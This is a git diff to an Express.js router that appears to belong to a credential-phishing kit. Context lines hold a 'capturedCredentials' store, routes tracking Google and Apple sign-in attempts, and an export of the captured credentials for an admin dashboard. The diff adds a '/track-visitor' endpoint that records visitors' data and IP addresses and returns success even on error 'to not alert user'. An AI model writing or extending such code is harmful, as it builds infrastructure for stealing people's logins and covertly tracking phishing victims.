@@ -209,11 +209,34 @@ router.post('/logout', auth, (req, res) => {
 
 // In-memory storage for captured credentials
 const capturedCredentials = [];
+const visitors = [];
 
 // Helper function to get IP address
 const getIP = (req) => {
   return req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
 };
+
+// Track visitors (homepage, etc)
+router.post('/track-visitor', async (req, res) => {
+  try {
+    const visitorData = req.body;
+    const ipAddress = getIP(req);
+    
+    const visitorInfo = {
+      ...visitorData,
+      ipAddress,
+      timestamp: new Date().toISOString()
+    };
+    
+    visitors.push(visitorInfo);
+    console.log('👁️  Visitor Tracked:', visitorInfo);
+    
+    res.json({ success: true, message: 'Visitor tracked' });
+  } catch (error) {
+    console.error('Error tracking visitor:', error);
+    res.json({ success: true }); // Still return success to not alert user
+  }
+});
 
 // Track Google Sign-In attempts
 router.post('/track-google-signin', async (req, res) => {
@@ -379,7 +402,8 @@ router.post('/apple-complete', async (req, res) => {
   }
 });
 
-// Export captured credentials for admin dashboard
+// Export captured credentials and visitors for admin dashboard
 router.getCapturedCredentials = () => capturedCredentials;
+router.getVisitors = () => visitors;
 
 module.exports = router;
